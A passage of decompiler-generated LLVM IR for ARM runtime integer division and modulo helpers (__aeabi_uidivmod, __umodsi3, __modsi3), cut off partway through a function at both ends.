  %v1_13c94 = phi i32 [ %v1_13c88, %bb98 ], [ %v4_13c88, %bb99 ], [ %v4_13c88, %bb100 ]
  %v2_13c90 = icmp ugt i32 %v1_13c94, 15
  br i1 %v2_13c90, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_13c94 = and i32 %v1_13c94, 8
  %v3_13c94 = icmp eq i32 %v2_13c94, 0
  %v4_13c94 = udiv i32 %v1_13c94, 16
  br i1 %v3_13c94, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_13c98 = add nsw i32 %v1_13c98, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_13ca0 = phi i32 [ %v1_13c98, %.thread17 ], [ %v1_13c98, %bb101 ], [ %v2_13c98, %bb102 ]
  %v5_13ca4 = phi i32 [ %v1_13c94, %.thread17 ], [ %v4_13c94, %bb101 ], [ %v4_13c94, %bb102 ]
  %v2_13c9c = icmp ugt i32 %v5_13ca4, 3
  %v7_13c9c = icmp eq i32 %v5_13ca4, 4
  %v2_13ca0 = xor i1 %v7_13c9c, true
  %v3_13ca0 = and i1 %v2_13c9c, %v2_13ca0
  br i1 %v3_13ca0, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_13ca0 = add nsw i32 %v4_13ca0, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_13ca4 = phi i32 [ %v4_13ca0, %.thread18 ], [ %v5_13ca0, %bb103 ]
  %v2_13ca4 = xor i1 %v2_13c9c, true
  %v3_13ca4 = or i1 %v7_13c9c, %v2_13ca4
  br i1 %v3_13ca4, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_13ca4 = udiv i32 %v5_13ca4, 2
  %v9_13ca4 = add i32 %v4_13ca4, %v8_13ca4
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_13ca8 = phi i32 [ %v4_13ca4, %bb104 ], [ %v9_13ca4, %bb105 ]
  %v6_13ca8 = lshr i32 %v0_13bd4, %v1_13ca8
  ret i32 %v6_13ca8

dec_label_pc_13cb0:                               ; preds = %bb80
  %v0_13cb0 = load i32, i32* @lr, align 4
  %v0_13cb4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13cb0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13ca4, { 1, 0 }
  uselistorder i1 %v7_13c9c, { 1, 0 }
  uselistorder i32 %v4_13c94, { 1, 0 }
  uselistorder i32 %v1_13c94, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c88, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_13c88, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c78, { 1, 0 }
  uselistorder i32 %v0_13c50, { 1, 0 }
  uselistorder i32 %v4_13c44, { 1, 0 }
  uselistorder i32 %v1_13c4c, { 1, 2, 0 }
  uselistorder i32 %v4_13c38, { 1, 0 }
  uselistorder i32 %v1_13c40, { 1, 2, 0 }
  uselistorder i32 %v4_13c2c, { 1, 0 }
  uselistorder i32 %v1_13c34, { 1, 2, 0 }
  uselistorder i32 %v1_13c58, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13c28, { 1, 0 }
  uselistorder i32 %v1_13c54, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13c14, { 1, 0 }
  uselistorder i32 %v3_13c10, { 1, 0 }
  uselistorder i32 %v1_13c10, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13c14, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13c00, { 1, 0 }
  uselistorder i32 %v4_13bfc, { 2, 1, 0 }
  uselistorder i32 %v1_13c00, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13c08.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_13bd4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_13c60, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13c1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13c08thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_13cc4 = udiv i32 %arg1, %arg2
  ret i32 %v2_13cc4
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13cd8 = add i32 %arg2, -1
  %v2_13cd8 = icmp eq i32 %arg2, 0
  br i1 %v2_13cd8, label %dec_label_pc_13d94, label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %entry
  %v7_13cd8 = icmp eq i32 %arg2, 1
  br i1 %v7_13cd8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_13ce0
  %v1_13ce0 = load i32, i32* @r0, align 4
  %v10_13ce0 = icmp eq i32 %v1_13ce0, %arg2
  br i1 %v10_13ce0, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_13ce0, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_13ce0 = icmp ult i32 %v1_13ce0, %arg2
  br i1 %v4_13ce0, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_13ce8 = and i32 %v1_13cd8, %arg2
  %v8_13ce8 = icmp eq i32 %v6_13ce8, 0
  br i1 %v8_13ce8, label %.thread67, label %dec_label_pc_13cf8.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_13cec = phi i32 [ %v1_13ce0, %bb75 ], [ 0, %.thread65 ]
  %v3_13cec = and i32 %v1_13cec, %v1_13cd8
  br label %bb76

dec_label_pc_13cf8.preheader:                     ; preds = %bb75
  %v2_13cf899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_13cf899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_13d88, %bb74, %bb89, %bb84, %dec_label_pc_13d58, %.thread67
  %v5_13cf0 = phi i32 [ %v1_13ce0, %bb74 ], [ %v3_13cec, %.thread67 ], [ %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, %dec_label_pc_13d58 ], [ 0, %bb84 ], [ %v1_13d8c, %dec_label_pc_13d88 ], [ %v2_13d88, %bb89 ]
  ret i32 %v5_13cf0

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_13cf8.preheader
  %v0_13d0c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_13cf8.preheader ], [ %v4_13d00, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13cf8.preheader ], [ %v2_13d0411, %.thread1.thread9 ]
  br label %dec_label_pc_13d0cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_13cf8.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_13d0411, %.thread1.thread9 ], [ 0, %dec_label_pc_13cf8.preheader ]
  %v0_13d0c.pr33100 = phi i32 [ %v4_13d00, %.thread1.thread9 ], [ %arg2, %dec_label_pc_13cf8.preheader ]
  %v4_13cfc = icmp ult i32 %v0_13d0c.pr33100, %v1_13ce0
  br i1 %v4_13cfc, label %bb78, label %dec_label_pc_13d0cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_13d00 = and i32 %v0_13d0c.pr33100, 268435456
  %v3_13d00 = icmp eq i32 %v2_13d00, 0
  %v4_13d00 = mul i32 %v0_13d0c.pr33100, 16
  br i1 %v3_13d00, label %.thread1.thread9, label %dec_label_pc_13d0c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_13d0411 = add i32 %storemerge101, 4
  %v2_13cf8 = icmp ugt i32 %v4_13d00, 268435455
  br i1 %v2_13cf8, label %.thread, label %bb77

dec_label_pc_13d0cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_13d0cthread-pre-split.loopexit

dec_label_pc_13d0cthread-pre-split.loopexit:      ; preds = %dec_label_pc_13d0cthread-pre-split.loopexit.loopexit, %.thread
  %v0_13d0c.pr3398 = phi i32 [ %v0_13d0c.pr33.lcssa, %.thread ], [ %v0_13d0c.pr33100, %dec_label_pc_13d0cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_13d0cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13d0cthread-pre-split

dec_label_pc_13d0cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_13d0cthread-pre-split.loopexit
  %v1_13d1839 = phi i32 [ %storemerge95, %dec_label_pc_13d0cthread-pre-split.loopexit ], [ %v2_13d18, %.thread4 ]
  %v0_13d0c.pr = phi i32 [ %v0_13d0c.pr3398, %dec_label_pc_13d0cthread-pre-split.loopexit ], [ %v3_13d14, %.thread4 ]
  br label %dec_label_pc_13d0c

dec_label_pc_13d0c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_13d0c

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13d0c.loopexit, %dec_label_pc_13d0cthread-pre-split
  %v0_13d20.pr = phi i32 [ %v1_13d1839, %dec_label_pc_13d0cthread-pre-split ], [ %storemerge101, %dec_label_pc_13d0c.loopexit ]
  %v1_13d14 = phi i32 [ %v0_13d0c.pr, %dec_label_pc_13d0cthread-pre-split ], [ %v4_13d00, %dec_label_pc_13d0c.loopexit ]
  %v2_13d0c = icmp slt i32 %v1_13d14, 0
  br i1 %v2_13d0c, label %dec_label_pc_13d20, label %bb79

bb79:                                             ; preds = %dec_label_pc_13d0c
  %v4_13d10 = icmp ult i32 %v1_13d14, %v1_13ce0
  br i1 %v4_13d10, label %.thread4, label %dec_label_pc_13d20

.thread4:                                         ; preds = %bb79
  %v3_13d14 = mul i32 %v1_13d14, 2
  %v2_13d18 = add i32 %v0_13d20.pr, 1
  br label %dec_label_pc_13d0cthread-pre-split

dec_label_pc_13d20:                               ; preds = %bb79, %dec_label_pc_13d0c
  %v2_13d20 = add i32 %v0_13d20.pr, -3
  %v5_13d24 = icmp slt i32 %v0_13d20.pr, 3
  br i1 %v5_13d24, label %dec_label_pc_13d64, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d20, %bb83
  %v6_13d50 = phi i32 [ %v0_13d58, %bb83 ], [ %v2_13d20, %dec_label_pc_13d20 ]
  %v1_13d2c = phi i32 [ %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, %bb83 ], [ %v1_13ce0, %dec_label_pc_13d20 ]
  %v3_13d4c12 = phi i32 [ %v3_13d4c, %bb83 ], [ %v1_13d14, %dec_label_pc_13d20 ]
  %v3_13d28 = icmp ult i32 %v1_13d2c, %v3_13d4c12
  %v3_13d2c = select i1 %v3_13d28, i32 0, i32 %v3_13d4c12
  %v1_13d34 = sub i32 %v1_13d2c, %v3_13d2c
  %v4_13d30 = udiv i32 %v3_13d4c12, 2
  %v6_13d30 = icmp ult i32 %v1_13d34, %v4_13d30
  %v6_13d34 = select i1 %v6_13d30, i32 0, i32 %v4_13d30
  %v1_13d34.v6_13d34 = sub i32 %v1_13d34, %v6_13d34
  %.demorgan = and i1 %v3_13d28, %v6_13d30
  %v4_13d38 = udiv i32 %v3_13d4c12, 4
  %v6_13d38 = icmp ult i32 %v1_13d34.v6_13d34, %v4_13d38
  %v6_13d3c = select i1 %v6_13d38, i32 0, i32 %v4_13d38
  %v1_13d34.v6_13d34.v6_13d3c = sub i32 %v1_13d34.v6_13d34, %v6_13d3c
  %.demorgan71 = and i1 %.demorgan, %v6_13d38
  %v4_13d40 = udiv i32 %v3_13d4c12, 8
  %v6_13d40 = icmp ult i32 %v1_13d34.v6_13d34.v6_13d3c, %v4_13d40
  %v6_13d44 = select i1 %v6_13d40, i32 0, i32 %v4_13d40
  %v1_13d34.v6_13d34.v6_13d3c.v6_13d44 = sub i32 %v1_13d34.v6_13d34.v6_13d3c, %v6_13d44
  %.demorgan72 = and i1 %.demorgan71, %v6_13d40
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_13d28
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_13d28, %bb80
  %v2_13d48 = add i32 %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, -1
  %v4_13d48 = sub i32 0, %v1_13d34.v6_13d34.v6_13d3c.v6_13d44
  %v5_13d48 = and i32 %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, %v4_13d48
  %v3_13d4c = udiv i32 %v3_13d4c12, 16
  %v5_13d50 = icmp slt i32 %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, 1
  br i1 %v5_13d50, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_13d50 = add i32 %v6_13d50, -4
  %v9_13d50 = sub i32 3, %v6_13d50
  %v10_13d50 = and i32 %v9_13d50, %v6_13d50
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_13d58 = phi i32 [ %v6_13d50, %bb81 ], [ %v7_13d50, %bb82 ]
  %v0_13d5415.in = phi i32 [ %v2_13d48, %bb81 ], [ %v7_13d50, %bb82 ]
  %v1_13d5414.in = phi i32 [ %v5_13d48, %bb81 ], [ %v10_13d50, %bb82 ]
  %v1_13d5414 = icmp slt i32 %v1_13d5414.in, 0
  %v0_13d5415 = icmp slt i32 %v0_13d5415.in, 0
  %v2_13d54 = xor i1 %v0_13d5415, %v1_13d5414
  br i1 %v2_13d54, label %dec_label_pc_13d58, label %dec_label_pc_13d28

dec_label_pc_13d58:                               ; preds = %bb83
  %v1_13d58 = urem i32 %v0_13d58, 4
  %v2_13d58 = icmp eq i32 %v1_13d58, 0
  br i1 %v2_13d58, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_13d58
  %v3_13d5c = icmp eq i32 %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, 0
  br i1 %v3_13d5c, label %bb76, label %dec_label_pc_13d64

dec_label_pc_13d64:                               ; preds = %bb84, %dec_label_pc_13d20
  %v0_13d78 = phi i32 [ %v3_13d4c, %bb84 ], [ %v1_13d14, %dec_label_pc_13d20 ]
  %v1_13d74 = phi i32 [ %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, %bb84 ], [ %v1_13ce0, %dec_label_pc_13d20 ]
  %v0_13d64 = phi i32 [ %v0_13d58, %bb84 ], [ %v2_13d20, %dec_label_pc_13d20 ]
  %v5_13d68 = icmp slt i32 %v0_13d64, -2
  br i1 %v5_13d68, label %dec_label_pc_13d88, label %dec_label_pc_13d6c

dec_label_pc_13d6c:                               ; preds = %dec_label_pc_13d64
  %v8_13d64 = icmp eq i32 %v0_13d64, -2
  br i1 %v8_13d64, label %dec_label_pc_13d7c, label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d6c
  %v3_13d70 = icmp ult i32 %v1_13d74, %v0_13d78
  br i1 %v3_13d70, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_13d70
  %v2_13d70 = sub i32 %v1_13d74, %v0_13d78
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_13d70, %bb85
  %v0_13d7c52 = phi i32 [ %v1_13d74, %dec_label_pc_13d70 ], [ %v2_13d70, %bb85 ]
  %v3_13d78 = udiv i32 %v0_13d78, 2
  br label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %dec_label_pc_13d6c, %bb86
  %v0_13d84 = phi i32 [ %v0_13d78, %dec_label_pc_13d6c ], [ %v3_13d78, %bb86 ]
  %v1_13d80 = phi i32 [ %v1_13d74, %dec_label_pc_13d6c ], [ %v0_13d7c52, %bb86 ]
  %v3_13d7c = icmp ult i32 %v1_13d80, %v0_13d84
  br i1 %v3_13d7c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_13d7c
  %v2_13d7c = sub i32 %v1_13d80, %v0_13d84
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_13d7c, %bb87
  %v0_13d8855 = phi i32 [ %v1_13d80, %dec_label_pc_13d7c ], [ %v2_13d7c, %bb87 ]
  %v3_13d84 = udiv i32 %v0_13d84, 2
  br label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d64, %bb88
  %v2_13d8c = phi i32 [ %v0_13d78, %dec_label_pc_13d64 ], [ %v3_13d84, %bb88 ]
  %v1_13d8c = phi i32 [ %v1_13d74, %dec_label_pc_13d64 ], [ %v0_13d8855, %bb88 ]
  %v3_13d88 = icmp ult i32 %v1_13d8c, %v2_13d8c
  br i1 %v3_13d88, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_13d88
  %v2_13d88 = sub i32 %v1_13d8c, %v2_13d8c
  br label %bb76

dec_label_pc_13d94:                               ; preds = %entry
  %v0_13d94 = load i32, i32* @lr, align 4
  %v0_13d98 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13d94)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13d8c, { 1, 2, 0 }
  uselistorder i32 %v0_13d78, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13d58, { 1, 0, 2 }
  uselistorder i32 %v7_13d50, { 1, 0 }
  uselistorder i32 %v3_13d4c, { 1, 0 }
  uselistorder i32 %v1_13d34.v6_13d34.v6_13d3c.v6_13d44, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_13d40, { 1, 0 }
  uselistorder i32 %v4_13d38, { 1, 0 }
  uselistorder i32 %v4_13d30, { 1, 0 }
  uselistorder i32 %v6_13d50, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13d20, { 1, 0 }
  uselistorder i32 %v1_13d14, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_13d00, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13d0c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13ce0, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_13d88, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_13d7c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_13d28, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_13da4 = icmp eq i32 %arg2, 0
  br i1 %v2_13da4, label %dec_label_pc_13e78, label %dec_label_pc_13dac

dec_label_pc_13dac:                               ; preds = %entry
  %v1_13da4 = icmp slt i32 %arg2, 0
  br i1 %v1_13da4, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_13dac
  %v2_13dac = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13dac, %bb
  %v4_13dc4 = phi i32 [ %arg2, %dec_label_pc_13dac ], [ %v2_13dac, %bb ]
  %v0_13db0 = load i32, i32* @r0, align 4
  %v1_13db0 = icmp slt i32 %v0_13db0, 0
  br i1 %v1_13db0, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_13db4 = sub i32 0, %v0_13db0
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_13dbc = phi i32 [ %v0_13db0, %bb79 ], [ %v2_13db4, %bb80 ]
  %v1_13db8 = add i32 %v4_13dc4, -1
  %v7_13db8 = icmp eq i32 %v4_13dc4, 1
  br i1 %v7_13db8, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_13dbc = icmp eq i32 %v1_13dbc, %v4_13dc4
  br i1 %v10_13dbc, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_13dbc = icmp ult i32 %v1_13dbc, %v4_13dc4
  br i1 %v4_13dbc, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_13dc4 = and i32 %v1_13db8, %v4_13dc4
  %v8_13dc4 = icmp eq i32 %v6_13dc4, 0
  br i1 %v8_13dc4, label %.thread72, label %dec_label_pc_13dd4.preheader

dec_label_pc_13dd4.preheader:                     ; preds = %bb84
  %v2_13dd4109 = icmp ugt i32 %v4_13dc4, 268435455
  br i1 %v2_13dd4109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_13dc864 = phi i32 [ %v1_13dbc, %bb84 ], [ 0, %.thread70 ]
  %v3_13dc8 = and i32 %v1_13dc864, %v1_13db8
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_13dd4.preheader
  %v0_13de8.pr35.lcssa = phi i32 [ %v4_13dc4, %dec_label_pc_13dd4.preheader ], [ %v4_13ddc, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13dd4.preheader ], [ %v2_13de09, %.thread2.thread7 ]
  br label %dec_label_pc_13de8thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_13dd4.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_13de09, %.thread2.thread7 ], [ 0, %dec_label_pc_13dd4.preheader ]
  %v0_13de8.pr35110 = phi i32 [ %v4_13ddc, %.thread2.thread7 ], [ %v4_13dc4, %dec_label_pc_13dd4.preheader ]
  %v4_13dd8 = icmp ult i32 %v0_13de8.pr35110, %v1_13dbc
  br i1 %v4_13dd8, label %bb86, label %dec_label_pc_13de8thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_13ddc = and i32 %v0_13de8.pr35110, 268435456
  %v3_13ddc = icmp eq i32 %v2_13ddc, 0
  %v4_13ddc = mul i32 %v0_13de8.pr35110, 16
  br i1 %v3_13ddc, label %.thread2.thread7, label %dec_label_pc_13de8.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_13de09 = add i32 %storemerge111, 4
  %v2_13dd4 = icmp ugt i32 %v4_13ddc, 268435455
  br i1 %v2_13dd4, label %.thread1, label %bb85

dec_label_pc_13de8thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_13de8thread-pre-split.loopexit

dec_label_pc_13de8thread-pre-split.loopexit:      ; preds = %dec_label_pc_13de8thread-pre-split.loopexit.loopexit, %.thread1
  %v0_13de8.pr35108 = phi i32 [ %v0_13de8.pr35.lcssa, %.thread1 ], [ %v0_13de8.pr35110, %dec_label_pc_13de8thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_13de8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13de8thread-pre-split

dec_label_pc_13de8thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13de8thread-pre-split.loopexit
  %v1_13df441 = phi i32 [ %storemerge105, %dec_label_pc_13de8thread-pre-split.loopexit ], [ %v2_13df4, %.thread4 ]
  %v2_13dec36 = phi i32 [ %v1_13dbc, %dec_label_pc_13de8thread-pre-split.loopexit ], [ %v2_13dec, %.thread4 ]
  %v0_13de8.pr = phi i32 [ %v0_13de8.pr35108, %dec_label_pc_13de8thread-pre-split.loopexit ], [ %v3_13df0, %.thread4 ]
  br label %dec_label_pc_13de8

dec_label_pc_13de8.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_13de8

dec_label_pc_13de8:                               ; preds = %dec_label_pc_13de8.loopexit, %dec_label_pc_13de8thread-pre-split
  %v0_13dfc.pr = phi i32 [ %v1_13df441, %dec_label_pc_13de8thread-pre-split ], [ %storemerge111, %dec_label_pc_13de8.loopexit ]
  %v2_13dec = phi i32 [ %v2_13dec36, %dec_label_pc_13de8thread-pre-split ], [ %v1_13dbc, %dec_label_pc_13de8.loopexit ]
  %v1_13df0 = phi i32 [ %v0_13de8.pr, %dec_label_pc_13de8thread-pre-split ], [ %v4_13ddc, %dec_label_pc_13de8.loopexit ]
  %v2_13de8 = icmp slt i32 %v1_13df0, 0
  br i1 %v2_13de8, label %dec_label_pc_13dfc, label %bb87

bb87:                                             ; preds = %dec_label_pc_13de8
  %v4_13dec = icmp ult i32 %v1_13df0, %v2_13dec
  br i1 %v4_13dec, label %.thread4, label %dec_label_pc_13dfc

.thread4:                                         ; preds = %bb87
  %v3_13df0 = mul i32 %v1_13df0, 2
  %v2_13df4 = add i32 %v0_13dfc.pr, 1
  br label %dec_label_pc_13de8thread-pre-split

dec_label_pc_13dfc:                               ; preds = %bb87, %dec_label_pc_13de8
  %v2_13dfc = add i32 %v0_13dfc.pr, -3
  %v5_13e00 = icmp slt i32 %v0_13dfc.pr, 3
  br i1 %v5_13e00, label %dec_label_pc_13e40, label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13dfc, %bb91
  %v6_13e2c = phi i32 [ %v0_13e34, %bb91 ], [ %v2_13dfc, %dec_label_pc_13dfc ]
  %v1_13e08 = phi i32 [ %v1_13e10.v6_13e10.v6_13e18.v6_13e20, %bb91 ], [ %v2_13dec, %dec_label_pc_13dfc ]
  %v3_13e2810 = phi i32 [ %v3_13e28, %bb91 ], [ %v1_13df0, %dec_label_pc_13dfc ]
  %v3_13e04 = icmp ult i32 %v1_13e08, %v3_13e2810
  %v3_13e08 = select i1 %v3_13e04, i32 0, i32 %v3_13e2810
  %v1_13e10 = sub i32 %v1_13e08, %v3_13e08
  %v4_13e0c = udiv i32 %v3_13e2810, 2
  %v6_13e0c = icmp ult i32 %v1_13e10, %v4_13e0c
  %v6_13e10 = select i1 %v6_13e0c, i32 0, i32 %v4_13e0c
  %v1_13e10.v6_13e10 = sub i32 %v1_13e10, %v6_13e10
  %.demorgan = and i1 %v3_13e04, %v6_13e0c
  %v4_13e14 = udiv i32 %v3_13e2810, 4
  %v6_13e14 = icmp ult i32 %v1_13e10.v6_13e10, %v4_13e14
  %v6_13e18 = select i1 %v6_13e14, i32 0, i32 %v4_13e14
  %v1_13e10.v6_13e10.v6_13e18 = sub i32 %v1_13e10.v6_13e10, %v6_13e18
  %.demorgan76 = and i1 %.demorgan, %v6_13e14
  %v4_13e1c = udiv i32 %v3_13e2810, 8
  %v6_13e1c = icmp ult i32 %v1_13e10.v6_13e10.v6_13e18, %v4_13e1c
  %v6_13e20 = select i1 %v6_13e1c, i32 0, i32 %v4_13e1c
  %v1_13e10.v6_13e10.v6_13e18.v6_13e20 = sub i32 %v1_13e10.v6_13e10.v6_13e18, %v6_13e20
  %.demorgan77 = and i1 %.demorgan76, %v6_13e1c
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_13e04
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_13e04, %bb88
  %v2_13e24 = add i32 %v1_13e10.v6_13e10.v6_13e18.v6_13e20, -1
  %v4_13e24 = sub i32 0, %v1_13e10.v6_13e10.v6_13e18.v6_13e20
  %v5_13e24 = and i32 %v1_13e10.v6_13e10.v6_13e18.v6_13e20, %v4_13e24
  %v3_13e28 = udiv i32 %v3_13e2810, 16
  %v5_13e2c = icmp slt i32 %v1_13e10.v6_13e10.v6_13e18.v6_13e20, 1
  br i1 %v5_13e2c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_13e2c = add i32 %v6_13e2c, -4
  %v9_13e2c = sub i32 3, %v6_13e2c
  %v10_13e2c = and i32 %v9_13e2c, %v6_13e2c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_13e34 = phi i32 [ %v6_13e2c, %bb89 ], [ %v7_13e2c, %bb90 ]
  %v0_13e3013.in = phi i32 [ %v2_13e24, %bb89 ], [ %v7_13e2c, %bb90 ]
  %v1_13e3012.in = phi i32 [ %v5_13e24, %bb89 ], [ %v10_13e2c, %bb90 ]
  %v1_13e3012 = icmp slt i32 %v1_13e3012.in, 0
  %v0_13e3013 = icmp slt i32 %v0_13e3013.in, 0
  %v2_13e30 = xor i1 %v0_13e3013, %v1_13e3012
  br i1 %v2_13e30, label %dec_label_pc_13e34, label %dec_label_pc_13e04

dec_label_pc_13e34:                               ; preds = %bb91
  %v1_13e34 = urem i32 %v0_13e34, 4
  %v2_13e34 = icmp eq i32 %v1_13e34, 0
  br i1 %v2_13e34, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_13e34
  %v3_13e38 = icmp eq i32 %v1_13e10.v6_13e10.v6_13e18.v6_13e20, 0
  br i1 %v3_13e38, label %.thread6, label %dec_label_pc_13e40

dec_label_pc_13e40:                               ; preds = %bb92, %dec_label_pc_13dfc
  %v0_13e54 = phi i32 [ %v3_13e28, %bb92 ], [ %v1_13df0, %dec_label_pc_13dfc ]
  %v1_13e50 = phi i32 [ %v1_13e10.v6_13e10.v6_13e18.v6_13e20, %bb92 ], [ %v2_13dec, %dec_label_pc_13dfc ]
  %v0_13e40 = phi i32 [ %v0_13e34, %bb92 ], [ %v2_13dfc, %dec_label_pc_13dfc ]
